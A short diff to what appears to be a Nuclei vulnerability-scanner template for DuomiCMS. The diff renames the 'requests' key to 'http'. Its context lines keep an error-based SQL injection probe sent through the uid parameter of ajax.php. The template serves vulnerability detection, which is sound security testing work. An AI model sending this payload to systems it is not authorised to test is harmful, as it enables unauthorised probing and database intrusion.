@@ -7,7 +7,7 @@ info:
   reference: https://redn3ck.github.io/2016/11/01/duomiCMS/
   tags: duomicms,sqli
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5(9999999999)))"
